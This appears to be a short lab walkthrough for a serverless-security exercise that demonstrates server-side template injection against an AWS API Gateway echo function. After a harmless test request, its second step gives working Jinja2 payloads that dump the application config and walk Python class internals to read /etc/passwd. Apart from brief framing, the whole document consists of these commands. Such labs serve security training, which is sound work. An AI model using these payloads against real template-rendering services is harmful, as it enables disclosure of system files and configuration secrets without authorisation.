# **Server-Side Template Injection**


### *  *

-------

#### Step 1:

* On the provisioned server, post a payload to a serverless function

```commandline
http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term=hello
```

* It can be observed that the payload is being rendered

-------

#### Step 2:

* Try to fetch the system configurations and `/etc/passwd` of the function

```commandline
http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"

http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"
```
